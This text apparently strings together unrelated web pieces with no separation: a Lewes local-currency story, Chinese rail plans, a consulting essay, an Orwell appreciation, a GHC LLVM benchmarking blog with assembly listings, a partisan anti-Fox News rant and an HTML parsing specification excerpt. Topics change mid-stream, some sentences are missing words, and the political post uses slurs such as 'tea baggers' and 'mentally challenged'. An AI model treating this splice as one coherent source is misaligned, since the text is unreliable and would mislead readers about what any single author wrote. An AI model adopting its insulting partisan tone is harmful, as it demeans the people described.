In Cliffe High Street , Bill Collison , who runs Bill 's greengrocers , was an early convert .
" It 's a great idea for round here - a bit quirky , like bonfire night .
We like that in Lewes .
I can't see any downsides to doing it , especially if it brings more people into my shop . "
Neighbouring shopkeeper Andrew Clarke , who runs Potts ' china shop , has so far hung back from joining in , but admitted to being impressed by the notes .
" Security has been my worry and I 'd be happier if I knew the banks were backing it . "
Van Heel said one local bank manager had expressed interest before his head office put a stop to participation .
" We 'll realise we 're a success if we get the chain stores locally saying they will take the notes too .
Otherwise , if in a year 's time people say it 's been a waste of time we 'll just think of something else instead , " he said .
China is exploring the possibility of extending its high - speed train network as far as Europe , potentially cutting rail travel time between London and Beijing to as little as two days .
Officials hope to see the project completed over the next ten years , enabling passengers to travel the roughly 8,000 kilometre journey at speeds of up to 320 kilometres per hour .
Two lines to Europe are reportedly being considered under the proposals , one passing through India , Pakistan , and the Middle East , while a second would head to Germany via Russia .
Exact routes are currently undecided however .
A third line would extend south from China to connect Vietnam , Thailand , Burma and Malaysia .
Wang Mengshu , a member of the Chinese Academy of Engineering and a senior consultant on China 's domestic high - speed railways said this month that work on the Southeast Asia line had already begun .
" We have also already carried out the prospecting and survey work for the European network , and central and eastern European countries are keen for us to start , " Mr Wang said .
Chinese officials in Brussels were more cautious however .
" I understand we want to improve our rail networks , potentially as far as Europe , but whether they will be high speed or not is yet to be determined , " said one source .
Financing the project appears to be the main question , with China offering to bankroll the Burmese line in exchange for the country 's rich reserves of lithium , a metal used in batteries .
" We will use government money and bank loans , but the railways may also raise financing from the private sector and also from the host countries , " said Mr Wang , indicating the new lines would also be used to carry freight .
European experts say the current low maritime transport costs make it harder to justify an EU - China rail line on commercial grounds however .
With global trade seemingly unstoppable in early 2007 , ship builders were receiving record orders .
But the subsequent financial crisis and global economic slump led to a 12 percent fall in world trade flows last year , according to WTO figures
" The availability of good infrastructure is pivotal to the growth of trade between nations , " said Michael Clausecker , director - general of the Association of the European Rail Industry ( UNIFE ) .
" However , whether this is the case for the EU and China is questionable as there is a huge amount of maritime capacity , with more expected in the coming years , " he told EUobserver .
China is currently in the middle of a vast railway expansion project that aims to build nearly 30,500 kilometres of new railways in the next five years , connecting all its major cities with high - speed lines .
The world 's fastest train , the Harmony Express , was unveiled in the country last year .
Wholly Chinese - built , but using technology from Siemens and Kawasaki , the train is capable of a top speeds approaching 400 km/h .
In many organizations I have encountered during my consulting , people have complained about " Cobbler 's Children Syndrome " .
Like the proverbial children of the shoemaker who go without shoes , I have consulted to technology companies that have outdated computer systems , firms that do n't market themselves in any way , and consulting firms that fail to put into practice for themselves a single theory or model upon which they have built their businesses .
Everyone who works in these organizations is aware of the irony of these situations , and yet it 's very difficult for individuals , teams , or the organization as a whole to do anything to change the dynamic .
Perhaps there is some deep psychological reason why the " Cobblers Children " dynamic exists , like an who can prepare great meals for other people without personally partaking , as a means of vicariously enjoying food .
There may be a compensatory aspect to the syndrome in that , for example , one suffers from some kind of weakness , and becomes acutely aware of it .
Still struggling with it personally , you may know what it takes to help others deal with it .
For example , a shy person might be talented at helping others with their skills .
The shy person , through introspection and self awareness , knows how his or her manifests itself , and is therefore very adept at helping others identify and remedy difficulties in communicating to large groups .
There may also be a defensive aspect to this syndrome .
A person may develop a rigid and inflexible world view as a way of protecting him or herself from inner rebelliousness .
While still unconsciously resenting rules , the person may develop usually - effective strategies for keeping his or her impulses in check .
Then , he or she can take that show on the road and provide for others the same kind of order and control that he or she learned how to use personally .
For example , someone who works in auditing or quality control might have developed talents in uncovering discrepancies and variations because he or she learned how to maintain order and consistency in his or her life .
At times , however , particularly under , the person 's repressed desires for spontaneity and freedom might emerge , thereby rendering ironic the control of others .
Many clients I have worked with over the years have said that if they truly faced the irony of being a law firm that skirts the law , an investment firm that does n't manage its own investments , or a fitness company where all the executives are out of shape , they might go mad .
I look forward to hearing from you about your " Cobblers Children " experiences .
Where have you observed this phenomenon ?
What do you think might account for it ?
Client : “ Hmmm , could you make it bigger ? ”
Me : “ That ’s what she said . ”
Client : “ You ’re out . ”
It 's true that politics drove much of his writing , but we should also value his masterly characterisations of some of literature 's most memorable losers
Last June , the 60th anniversary of the publication of Nineteen Eighty - Four brought an abundance of renewed tributes for its author , George Orwell .
Articles sprung up about him from just about everywhere , including some pretty fine ones concerning his time on Jura and how his essays chart the formation of his most famous novel 's chilling vision of a totalitarian Britain .
As ever , it was his political legacy that garnered the most attention .
Alongside examinations of the novel 's power from literary perspectives , both the left and the right used his ideas to illustrate their opinions of the problems in modern society .
This treatment of Orwell is understandable : after all , he himself wrote , " Every line of serious work that I have written since 1936 has been written , directly or indirectly , against totalitarianism and for democratic socialism . "
The motive behind his writing was always intensely political .
Nevertheless ,
Orwell should not be read purely as a political writer .
It was his fiction that secured his reputation , and he relied on his characters as much as any other author .
Unfortunately , competing against such powerful concepts as Big Brother , Newspeak and Thoughtcrime , Orwell 's protagonists are all too often ignored .
Today , on the 60th anniversary of his death , they also deserve to be celebrated , especially as they form one of literature 's most striking collections of miserablists .
Orwell 's male leads are particularly compelling .
John Flory , Gordon Comstock and George Bowling , along with Nineteen Eighty - Four 's " small , frail " Winston Smith , would probably just shrug their shoulders if they were told how often they are overlooked .
Like the creatures in Spike Jonze 's adaptation of Where The Wild Things Are , their incessant melancholia only makes them all the more endearing .
Self - pitying , downtrodden , unattractive and all neurotically well aware of it , you could n't hope to meet a more wonderful bunch of losers .
With Orwell a keen follower of Dickens 's habit of making characters ' internal weaknesses manifest in their appearance , they 're a pitiful bunch in physical terms , too .
Comstock of Keep The Aspidistra Flying shares Winston 's frailness and can only sigh as girls in the street pass him by , their " cruel youthful eyes " going " over him and through him as though he had not existed . "
Flory of Burmese Days is consumed by shame at the dark blue birthmark running down his face .
And although Coming Up For Air's Bowling insists to readers he really is a rather cheerful fatty , the defining image of him comes while he is having his morning wash : " No woman , I thought as I worked the soap round my belly , will ever look twice at me again , unless she 's paid to .
Not that at that I moment I particularly wanted any woman to look twice at me . "
This sense of inadequate masculinity and constant self - awareness – the kind that makes Bowling picture himself walking down the road with his fat face , false teeth and vulgar clothes – is a huge part of what makes Orwell 's novels so readable .
Just look at how Winston greets Julia 's advances with a classically Orwellian self - assessment .
" I 'm thirty - nine years old .
I 've got a wife that I can't get rid of .
I 've got varicose veins .
I 've got false teeth , " he tells her .
" What could attract you to a man like me ? "
Who could resist that for a chat - up line ?
Had he been around in the real 1984 , Winston would surely have been a fan of the Smiths .
When it comes to self - deprecation , however , John Flory takes first prize .
" Sneaking , idling , boozing , fornicating , soul - examining , self - pitying cur , " he tells himself at one point .
" All those fools at the Club , those dull louts to whom you are so pleased to think yourself superior – they are all better than you , every man of them .
At least they are men in their oafish way .
Not cowards , not liars .
Not half - dead and rotting . "
It almost seems unfair to lump Dorothy Hare of A Clergyman 's Daughter in with this lot ; although her hair is her only " positive beauty " , she is at least " just pretty enough " to receive male attention .
The only trouble is that , in an inevitable twist , she does n't want their attention .
After catching sight of her parents indulging in " all that " in bed as a nine - year - old , she is firmly asexual , meaning even her slight attractiveness is in fact a disadvantage to her .
Trust Orwell to have come up with that .
It 's true that the pathetic nature of his characters was far from unpolitical on Orwell 's part .
After all , his tales of repression would n't work quite so well if they were delivered via handsome gentlemen and elegant ladies strolling around being suave and poised .
But whatever the calculation behind their creation as portraits of inadequacy , his characters make for great reading in themselves .
In this post we ’ll play with GHC ’s new LLVM code generator backend , and see how much faster some Haskell programs are when compiled with LLVM instead of GCC .
For the kind of loops we get from stream fusion , the - fllvm backend produced a lot better code , up to 3 x faster in some cases .
There are pretty graphs , and some smoking hot new technology .
Overview
This week David Terei announced that his work on an LLVM code generator backend for the Glasgow Haskell Compiler was ready to try out .
Initial reports from his undergraduate thesis held that the LLVM code generator was competitive with the current GHC native code generator , a bit slower than the C backend in general ( which uses GCC for code generation ) , but , tantalisingly , should produce big speedups for particular Haskell programs .
In particular , tight loops of the kind generated by the bytestring , vector , data parallel arrays or text libraries .
David reported speedups of 25 % over the previous best performance we ’d got from GHC for data parallel code .
I was very keen to try it out on the vector library — a fast , fusible numerical arrays package ( similar to NumPy ) , which generates some very tight loops .
Under the C backend , GCC has been failing to spot that the code GHC generates were actually loops , and this lead to GCC optimizing the generated code pretty badly .
The native code generator does ok , but does n’t have a lot of the clever low - level optimizations we need for really good bare metal performance .
So how would the new LLVM backend do ?
Setting up
To try out the LLVM backend I followed the instructions on the wiki .
Check out GHC HEAD from darcs .
Apply the LLVM patch .
Check out LLVM from svn
Apply the GHC patch
Build your GHC .
This worked out of the box , and I now have a GHC 6.13 with the - fllvm flag .
$ ghc -- info [ ( " Project name " , " The Glorious Glasgow Haskell Compilation System " ) , ( " Project version " , " 6.13.20100221 " ) , ( " Booter version " , " 6.12.1 " ) , ( " Stage " , " 2 " ) , ( " Have interpreter " , " YES " ) , ( " Object splitting " , " YES " ) , ( " Have native code generator " , " YES " ) , ( " Have llvm code generator " , " YES " ) , ( " Support SMP " , " YES " ) , ( " Unregisterised " , " NO " ) , ( " Tables next to code " , " NO " ) , ( " Win32 DLLs " , " " ) , ( " RTS ways " , " l debug thr thr_debug thr_l " ) , ( " Leading underscore " , " NO " ) , ( " Debug on " , " False " ) , (" LibDir " , " /home/dons/lib/ghc-6.13.20100221 " ) ]
Running on a dual core Core 2 laptop :
$ uname - msr Linux 2.6.32-ARCH
x86_64
You can then install packages as normal , via cabal , and add the - fllvm flag to see GHC build things via the new backend :
$ cabal install primitive -- ghc- options= - fllvm
The packages I ’m interested in are :
The darcs version of the vector package .
And some helper code in :
I also modifed the ghc - core tool to support showing the LLVM generated assembly .
Warm up lap
Let ’s check the backend is working ( remember to add the - fllvm flag ) :
$ ghc - O2 -- make A.hs - fllvm - fforce - recomp [ 1 of 1 ] Compiling Main ( A.hs , A.o ) Linking A ... $ time ./A " hey " ./A 0.00s user 0.00s system 61 % cpu 0.005 total
Good !
The LLVM backend is generating working code for x86_64 / Linux .
Now , something more ambitious … a program from the shootout .
A shootout program
So let ’s find some code that ’s already been optimized .
I ’l compile the pidgits shootout benchmarks ( where Haskell ’s already the fastest entry ) .
First , with the native code gen :
$ ghc - O2 - fasm A.hs –make - fforce - recomp
$ time ./A 10000 > /dev/null
. /A 10000 > / dev/null 3.19s user 0.03s system 91 % cpu 3.509 total
With the old GCC backend :
$ ghc - O2 - fvia - C - optc - O3 A.hs –make - fforce - recomp
$ time ./A 10000 > /dev/null
. /A 10000 > / dev/null 2.89s user 0.03s system 97 % cpu 2.988 total
And with the - fllvm backend :
$ ghc - O2 - fllvm A.hs –make - fforce - recomp
$ time ./A 10000 > /dev/null
. /A 10000 > / dev/null 2.86s user 0.02s system 98 % cpu 2.936 total
Woo .
It runs , and we get a speedup !
Now for some serious business .
The Vector Package
Vector is a Haskell library for working with arrays .
It provides several array types ( boxed , unboxed , C ) , with a rich interface similar to the lists library , and some functions reminiscent of Data Parallel Haskell .
There ’s a tutorial on how to use it .
The interface is built entirely around stream fusion combinators — a general form of classic loop fusion made possible by purity .
When you do multiple passes over the data ( e.g. sum / map/fold / filter / … ) the compiler will common up the loops , and discard intermediate arrays , making the code potentially very fast .
The loops that are generated tend to be very register heavy , do no heap allocation , and benefit from clever imperative loop optimizations .
Unfortunately , the GCC backend to GHC does n’t spot that these are actually loops , so does n’t get to fire many optimizations .
The promise of the LLVM backend is that it will recognize the loops GHC generates from fused code .
Let ’s see how it performs .
To benchmark these programs , I ’ll use the criterion and progression benchmarking libraries .
( I had to build the darcs version of gtk2hs , and compiler data accessor - template with the - ftemplate_ 2_4 flag )
Simple loops
To start off , let ’s generate 1 billion ints , sum them , print the result .
That should tell us if our loops are efficient :
import qualified Data .
Vector as U main = print .
U.sum $ U.enumFromTo 1 ( 1000000000 :: Int )
There are two loops in this program .
enumFromTo and sum .
The core
GHC compiles these two loops into a single loop , when compiled with - O2 or - Odph :
loop :: Int# -> Int# ->
Int# loop x y = case < =# y 1000000000 of
False -> x
True -> loop ( x +# y ) ( y +# 1 )
This is perfect .
We write “ sum ( enumFromTo 1 n ) ” and we get a non-allocating loop .
The native backend
GHC 6.13 with the native code generator generates the following assembly for the inner loop :
Main_mainzuzdszdwfoldlMzqzuloop_entry : .Lc21u : cmpq $ 1000000000 , %rsi jle .
Lc21 x movq %r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax ) .
Lc21x : addq %rsi , %r14 incq %rsi jmp Main_mainzuzdszdwfoldlMzqzuloop_entry
which runs in :
$ time ./ enum 500000000500000000 ./ enum 1.00s user 0.00s system 99 % cpu 1.008 total
The C backend
GHC 6.12.1 with the C backend , ( - fvia - C - optc - O3 ) ( I ’m having trouble linking programs with the C backend and GHC 6.13 ) , yields a pretty small loop :
Main_mainzuzdszdwfoldlMzqzuloop_info : cmpq $ 1000000000 , %r14 movq %r14 , %rax jle .L2 movq %rsi , %rbx jmp *( %rbp ) . L2 : leaq 1(%r14 ) , %r14 addq %rax , %rsi jmp Main_mainzuzdszdwfoldlMzqzuloop_info
Which runs slower than the native code generator :
$ time ./ enum 500000000500000000 ./ enum 1.09s user 0.00s system 99 % cpu 1.100 total
The LLVM backend
With - O2 - fllvm we get very different code , and it is a bit harder to work out what is going on .
LLVM transforms the code far more aggressively .
. LBB1_2 : leaq 1 ( %rsi ) , %rax addq %rsi , %r14 cmpq $ 1000000001 , %rax jge .
LBB1_5 # loop exit addq $ 2 , %rsi addq %rax , %r14 .
LBB1_1 : # %tailrecurse cmpq $ 1000000001 , %rsi jl .LBB1_2
And the proof is in the pudding :
$ time ./ enum 500000000500000000 ./ enum 0.48s user 0.01s system 99 % cpu 0.488 total
This is the fastest Haskell we ’ve ever generated for this little benchmark ( at least without manual loop unrolling ) !
The LLVM backend more than halved the running time for this simple loop .
But remember : general benchmarks are n’t seeing these kind of speedups — LLVM is really excelling itself at the tight numeric code .
Here ’s the data presented in a slightly different form , with criterion and progression .
The numbers are slightly different , since we wo n’t inline the length of the vector argument , and we ’re wrapping the code in benchmarking wrappers .
I was n’t able to get - fvia - C programs to link under the HEAD , so we ’ll exclude those from graphs , but report them in text form .
With the - fasm backend :
With the LLVM backend :
Or side - by - side with the progression package :
The - fasm backend under the progression tool ran around ~ 1s for each billion ints , while - fllvm was around 0.8s .
Note that we get slightly different timings with the loops under each benchmarking tool , due to how the benchmark program and wrapper are optimized .
Zips
Zips are another good candidate , since they turn into nested loops .
So , e.g .
import qualified Data .
Vector as U import Data .
Bits main = print .
U.sum .
U.map ( `shiftL` 1 ) $ U.zipWith (*) ( U.enumFromTo 1 ( 100000000 :: Int ) ) ( U.replicate ( 100000000 :: Int ) 42 )
Which fuses to this set of loops :
loop :: Int# -> Int# -> Int# ->
Int# loop = \ ( sc_s29 b :: Int# ) ( sc1_s29c :: Int# ) ( sc2_s29d :: Int# ) -> case <=# sc1_s29 c 100000000 of _ { False -> sc_s29 b ; True -> case <=# sc2_s29d 0 of _ { False -> loop ( +# sc_s29b ( uncheckedIShiftL# (*# sc1_s29c 42 ) 1 ) ) (+# sc1_s29c 1 ) ( -# sc2_s29d 1 ) ; True -> sc_s29b } }
Which , again , is perfect Core .
All those functions combined into a single non-allocating loop .
- fasm :
Main_mainzuzdszdwfoldlMzqzuloop_entry : .Lc2aC : cmpq $ 100000000 , %rsi jle .
Lc2 aE movq % r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax ) .
Lc2 aE : testq %rdi , %rdi jle .
Lc2 aH movq %rsi , %rax imulq $ 42 , %rax shlq $ 1 , %rax addq %rax , %r14 incq %rsi decq %rdi jmp Main_mainzuzdszdwfoldlMzqzuloop_entry .Lc2 aH : movq %r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax )
Which is reasonable :
$ time ./ zipwith
420000004200000000
./zipwith 0.24s user 0.00s system 99 % cpu 0.246 total
With the - fvia - C - optc - O3 backend , just the inner loop , since that ’s easy to read :
Main_mainzuzdszdwfoldlMzqzuloop_info : cmpq $ 100000000 , %rsi jg .L6 .L2 : testq %r14 , %r14 jle .L6 leaq ( %rsi , %rsi , 4 ) , %rcx leaq - 1(%r14 ) , %r14 leaq ( %rsi , %rcx , 4 ) , %rcx leaq 1 ( %rsi ) , %rsi leaq ( %rdi , %rcx , 4 ) , %rdi jmp Main_mainzuzdszdwfoldlMzqzuloop_info
Which runs in about the same time as the - fasm backend :
$ time ./zipwith 420000004200000000 ./zipwith 0.25s user 0.00s system 99 % cpu 0.251 total
With - fllvm the code is wildly different , and I find it pretty hard to reconstruct what transformatoins LLVM has done .
Main_mainzuzdszdwfoldlMzqzuloop_entry : # BB#0 : # % c2 cf subq $ 8 , %rsp imulq $ 84 , %rsi , %rax jmp .
LBB1_1 . LBB1_3 : # %n2cN # in Loop : Header=BB1_1 Depth=1 incq %rsi decq %rdi addq %rax , %r14 addq $ 84 , %rax .
LBB1_1 : # %tailrecurse # => This Inner Loop Header : Depth=1 cmpq $ 100000001 , %rsi # imm = 0x5F5E101 jge .
LBB1_4 # in Loop : Header=BB1_1 Depth=1 testq %rdi , %rdi jg .
LBB1_3 . LBB1_4 : # %n2ck movq ( %rbp ) , %rax movq %r14 , %rbx movq ( %rax ) , %r11 addq $ 8 , %rsp jmpq *%r11 # TAILCALL
The “ inner loop ” is interesting .
Nothing like what - fasm or - fvia - C generate .
And it ’s way faster :
$ time ./ zipwith
420000004200000000
./zipwith 0.15s user 0.00s system 99 % cpu 0.154 total
So yeah , 40 % faster !
Criterion
Here , under criterion ( same code , but different values of n ) , With the - fasm backend , mean execution time 186ms :
With the - fllvm backend , 135 ms ( 27 % improvement ) :
zipwith3
Heavily nested zips are probably the best cases for LLVM , and we see the - fllvm backend do some pretty wild stuff with this :
import qualified Data .
Vector .
Unboxed as U import Data .
Bits main = print .
U.sum $ U.zipWith3 ( \x y z -> x * y * z ) ( U.enumFromTo 1 ( 100000000 :: Int ) ) ( U.enumFromTo 2 ( 100000001 :: Int ) ) ( U.enumFromTo 7 ( 100000008 :: Int ) )
Which fuses to :
main_$s$wfoldlM'_loop [ Occ=LoopBreaker ] :: Int# -> Int# -> Int# -> Int# ->
Int# main_$s$wfoldlM'_loop = \ ( sc_s2jh :: Int# ) ( sc1_s2ji :: Int# ) ( sc2_s2jj :: Int# ) ( sc3_s2jk :: Int# ) -> case sc_s2jh ; True -> case sc_s2jh ; True -> case sc_s2jh ; True -> main_$s$wfoldlM'_loop (+# sc_s2jh ( *# (*# sc1_s2ji sc2_s2jj ) sc3_s2jk ) ) (+# sc1_s2 ji 1 ) ( +# sc2_s2 jj 1 ) (+# sc3_s2jk 1 ) } } }
Great core .
With the - fasm backend :
Main_mainzuzdszdwfoldlMzqzuloop_entry : . Lc2lq : cmpq $ 100000000 , %rsi jle .
Lc2ls movq % r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax ) .
Lc2ls : cmpq $ 100000001 , %rdi jle .
Lc2lu movq % r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax ) .
Lc2lu : cmpq $ 100000008 , %r8 jle .
Lc2lx movq %r14 , %rbx movq ( %rbp ) , %rax jmp *( %rax ) .
Lc2lx : movq %rdi , %rax imulq % r8 , %rax movq %rsi , %rcx imulq %rax , %rcx addq %rcx , %r14 incq %rsi incq %rdi incq %r8 jmp Main_mainzuzdszdwfoldlMzqzuloop_entry
Straight forward , and running it :
$ time ./zipwith3 3541230156834269568 ./zipwith3 0.47s user 0.01s system 98 % cpu 0.484 total
With - fvia - C - optc-O3 :
Main_mainzuzdszdwfoldlMzqzuloop_info : . text .p2align 4,,15 . text .align 8 .type Main_mainzuzdszdwfoldlMzqzuloop_info , @function # 38 " /tmp/ghc10013_0/ghc10013_0.hc " 1 # 0 " " 2 cmpq $ 100000000 , %rdi jg .L9 .L4 : cmpq $ 100000001 , %rsi jg .L9 .L5 : cmpq $ 100000008 , %r14 . p2align 4,,5 jg .L9 .L7 : movq %rsi , %r10 leaq 1 ( %rsi ) , %rsi imulq %rdi , %r10 leaq 1 ( %rdi ) , %rdi imulq % r14 , %r10 leaq 1(%r14 ) , %r14 leaq ( %r10 , %r8 ) , %r8 jmp Main_mainzuzdszdwfoldlMzqzuloop_info
And we get a faster result :
$ time ./zipwith3 3541230156834269568 ./zipwith3 0.34s user 0.00s system 99 % cpu 0.344 total

Some pretty wacky code , but a little faster .
Conclusions
The LLVM backend seems to be holding up to what we hoped : it does a better ( some times much better ) job on tight loops .
We get better code than GHC has ever produced before .
It seems pretty robust , so far everything I ’ve tried has worked .
David ’s benchmarks indicate that with the current — first attempt — at an LLVM backend most large programs are n’t noticeably faster , but I think the promise we see in these small examples justifies spending more time working on the LLVM backend to GHC .
It has much more potential than the GCC backend .
Currently we ’re not experimenting with the LLVM optimization layer at all — I think there ’s likely to be a lot of win just tweaking those settings ( and exposing them to the Haskell programmer via GHC flags ) .

Fox News continued today their last ditch attempt to muster hatred against democracy and the passage of the health care reform bill .
In an interesting bit of propaganda during America Live , the network went to commercial by showing angry tea partiers chanting kill the bill .
Only most mentally challenged could miss the point of this blatant Fox News propaganda message .
Here is the video courtesy of Media Matters :

While selling the delusion that the passage of health care reform will end up help Republicans , Fox News ended the segment with footage of tea baggers chanting , “ kill the bill , kill the bill . ”
Mind you , these people are so outraged because they do n’t want 32 million of their fellow Americans to have the ability to purchase health care so that they can go see a doctor .
The tea parties are a bizarre Frankenstein role reversal .
The bill is not the monster .
The mob is the monster .
Fox News is so desperate to stop this bill that they are creating the illusion that America is outraged by its passage .
Fox is not part of the pitchfork welding mob .
They are the village pitchfork salesman who is whipping up the outrage while slipping loads of cash into their pocket .
True journalistic organizations do not throw segments to commercial break with such an overtly partisan political message .
The network did not show footage of both the pro and anti health care protesters like true news organizations would .
Today ’s not so subtle insertion of propaganda into a news cast shows that it is a myth that Fox News has separate news and opinion divisions .
The news division works under orders to reinforce right wing ideology .
While they may not scream and cry by their chalkboard like Glenn Beck , they are working under the same mandate to spread the Republican message .
This is why Fox News should never , ever be taken seriously as a news organization .
They are not in the news business .
Their goal is to help further the GOP agenda , and every time the kill the bill chants are shown , that point is driven even further home .

I 'm not one of those people who spends his whole life wishing things had turned out differently .
Sure , the so - called " real world " can be a pretty cruel place sometimes , but why sit around all day worrying about the way things are when , with a little imagination , determination , and blinding denial , you can convince yourself that everything is great ?

It may sound crazy , but I 'm telling you , if you put your mind to it , you can make yourself believe just about anything !
Do n't let annoying little hang - ups like logic , reason , or even reality stand in the way of what you want to be true .
Your mind is the most powerful tool you have , and if you use it correctly , you 'll be amazed at all the incredible things you can deny .

Lose your job due to gross incompetence and whispers of corporate malfeasance ?
No , you did n't .
You left your job voluntarily and without incident , because it was stifling your creative energy .
Wife hate you because you 're a pathetic shell of the man she used to love ?
Wrong again .
In fact , you do n't even have a wife .
Not if you do n't want one !
It 's surprisingly simple .
All you have to do is block out what the actual , known universe is telling you is " happening . "
Voilà !
It does n't matter if your son repeatedly confides in you that he 's gay , even going so far as to introduce you on three separate occasions to the person he calls his boyfriend .
Your brain knows better than that .
Your brain knows that your son is a virile heterosexual man like his father , and that he has definitely not chosen a lifestyle that might be threatening to his father 's sense of self , which is strong , by the way , and in no way insecure .
The boy likes to fuck women , okay ?
End of story .

See ?
Was n't that easy ?
And now you do n't have to go to bed at night with all those horrible " truth pangs . "
And remember that no matter what happens , you must never throw in the towel .
A lot of people who are confronted by difficult circumstances in their lives will turn to drugs or alcohol as a way of " escaping " their problems .
Not me .
I am able to tell myself that that my drug and alcohol use is totally under control , that I could quit at anytime , and that I do n't use cocaine and tequila as a means of escape but merely as a way of cutting loose after a long day of being neither lonely nor unemployed .

It 's all in the way you do n't look at things !
It may seem hard at first , but once you start believing in God , and presupposing that this God condones all of your thoughts and actions , it gets a whole lot easier .

They are not even there .
They are somewhere far away , many miles from the warm , tropical beach where you are now relaxing in total , peaceful silence , undisturbed by what for a moment sounded like your wife banging on the door to your basement office , but what in reality — your reality — was just a few coconuts falling from a palm tree and landing with soft , reassuring thuds on the cool white sand below .

HTML Living Standard — Last Updated
12.2 Parsing HTML documents
This section only applies to user agents , data mining tools , and conformance checkers .
The rules for parsing XML documents into DOM trees are covered by the next section , entitled " The XML syntax " .
User agents must use the parsing rules described in this section to generate the DOM trees from text / html resources .
Together , these rules define what is referred to as the HTML parser .
While the HTML syntax described in this specification bears a close resemblance to SGML and XML , it is a separate language with its own parsing rules .
Some earlier versions of HTML ( in particular from HTML2 to HTML4 ) were based on SGML and used SGML parsing rules .
However , few ( if any ) web browsers ever implemented true SGML parsing for HTML documents ; the only user agents to strictly handle HTML as an SGML application have historically been validators .
The resulting confusion — with validators claiming documents to have one representation while widely deployed web browsers interoperably implemented a different representation — has wasted decades of productivity .
This version of HTML thus returns to a non-SGML basis .
Authors interested in using SGML tools in their authoring pipeline are encouraged to use XML tools and the XML serialization of HTML .
For the purposes of conformance checkers , if a resource is determined to be in the HTML syntax , then it is an HTML document .
As stated in the terminology section , references to element types that do not explicitly specify a namespace always refer to elements in the HTML namespace .
For example , if the spec talks about " a menu element " , then that is an element with the local name " menu " , the namespace " http://www.w3.org/1999/xhtml " , and the interface HTMLMenuElement .
Where possible , references to such elements are hyperlinked to their definition .
12.2.1 Overview of the parsing model
The input to the HTML parsing process consists of a stream of code points , which is passed through a tokenization stage followed by a tree construction stage .
The output is a Document object .
Implementations that do not support scripting do not have to actually create a DOM Document object , but the DOM tree in such cases is still used as the model for the rest of the specification .
In the common case , the data handled by the tokenization stage comes from the network , but it can also come from script running in the user agent , e.g. using the document .
write ( ) API .
There is only one set of states for the tokenizer stage and the tree construction stage , but the tree construction stage is reentrant , meaning that while the tree construction stage is handling one token , the tokenizer might be resumed , causing further tokens to be emitted and processed before the first token 's processing is complete .
In the following example , the tree construction stage will be called upon to handle a " p " start tag token while handling the " script " end tag token : ... < script > document .
write ( ' < p > ' ) ; </ script > ...
To handle these cases , parsers have a script nesting level , which must be initially set to zero , and a parser pause flag , which must be initially set to false .
12.2.2 Parse errors
This specification defines the parsing rules for HTML documents , whether they are syntactically correct or not .
Certain points in the parsing algorithm are said to be parse errors .
The error handling for parse errors is well - defined ( that 's the processing rules described throughout this specification ) , but user agents , while parsing an HTML document , may abort the parser at the first parse error that they encounter for which they do not wish to apply the rules described in this specification .
Conformance checkers must report at least one parse error condition to the user if one or more parse error conditions exist in the document and must not report parse error conditions if none exist in the document .
Conformance checkers may report more than one parse error condition if more than one parse error condition exists in the document .
Parse errors are only errors with the syntax of HTML .
In addition to checking for parse errors , conformance checkers will also verify that the document obeys all the other conformance requirements described in this specification .
Some parse errors have dedicated codes outlined in the table below that should be used by conformance checkers in reports .
Error descriptions in the table below are non-normative .
12.2.3
The input byte stream
The stream of code points that comprises the input to the tokenization stage will be initially seen by the user agent as a stream of bytes ( typically coming over the network or from the local file system ) .
The bytes encode the actual characters according to a particular character encoding , which the user agent uses to decode the bytes into characters .
For XML documents , the algorithm user agents are required to use to determine the character encoding is given by XML .
This section does not apply to XML documents . [ XML ]
Usually , the encoding sniffing algorithm defined below is used to determine the character encoding .
Given a character encoding , the bytes in the input byte stream must be converted to characters for the tokenizer 's input stream , by passing the input byte stream and character encoding to decode .
A leading Byte Order Mark ( BOM ) causes the character encoding argument to be ignored and will itself be skipped .
Bytes or sequences of bytes in the original byte stream that did not conform to the Encoding standard ( e.g. invalid UTF - 8 byte sequences in a UTF - 8 input byte stream ) are errors that conformance checkers are expected to report .
[ ENCODING ]
The decoder algorithms describe how to handle invalid input ; for security reasons , it is imperative that those rules be followed precisely .
Differences in how invalid byte sequences are handled can result in , amongst other problems , script injection vulnerabilities ( " XSS " ) .
When the HTML parser is decoding an input byte stream , it uses a character encoding and a confidence .
The confidence is either tentative , certain , or irrelevant .
The encoding used , and whether the confidence in that encoding is tentative or certain , is used during the parsing to determine whether to change the encoding .
If no encoding is necessary , e.g. because the parser is operating on a Unicode stream and does n't have to use a character encoding at all , then the confidence is irrelevant .
Some algorithms feed the parser by directly adding characters to the input stream rather than adding bytes to the input byte stream .
12.2.3.1 Parsing with a known character encoding
When the HTML parser is to operate on an input byte stream that has a known definite encoding , then the character encoding is that encoding and the confidence is certain .
12.2.3.2 Determining the character encoding
In some cases , it might be impractical to unambiguously determine the encoding before parsing the document .
Because of this , this specification provides for a two - pass mechanism with an optional pre-scan .
Implementations are allowed , as described below , to apply a simplified parsing algorithm to whatever bytes they have available before beginning to parse the document .
Then , the real parser is started , using a tentative encoding derived from this pre-parse and other out - of - band metadata .
If , while the document is being loaded , the user agent discovers a character encoding declaration that conflicts with this information , then the parser can get reinvoked to perform a parse of the document with the real encoding .
User agents must use the following algorithm , called the encoding sniffing algorithm , to determine the character encoding to use when decoding a document in the first pass .
This algorithm takes as input any out - of - band metadata available to the user agent ( e.g. the Content - Type metadata of the document ) and all the bytes available so far , and returns a character encoding and a confidence that is either tentative or certain .
The document 's character encoding must immediately be set to the value returned from this algorithm , at the same time as the user agent uses the returned value to select the decoder to use for the input byte stream .
When an algorithm requires a user agent to prescan a byte stream to determine its encoding , given some defined end condition , then it must run the following steps .
These steps either abort unsuccessfully or return a character encoding .
If at any point during these steps ( including during instances of the get an attribute algorithm invoked by this one ) the user agent either runs out of bytes ( meaning the position pointer created in the first step below goes beyond the end of the byte stream obtained so far ) or reaches its end condition , then abort the prescan a byte stream to determine its encoding algorithm unsuccessfully .
Let position be a pointer to a byte in the input byte stream , initially pointing at the first byte .
Loop :
If position points to : A sequence of bytes starting with : 0x3C 0x21 0x2D 0x2D ( ` <!-- `)
Advance the position pointer so that it points at the first 0x3E byte which is preceded by two 0x2D bytes ( i.e. at the end of an ASCII '-->' sequence ) and comes after the 0x3C byte that was found .
( The two 0x2D bytes can be the same as those in the '<!--' sequence . )
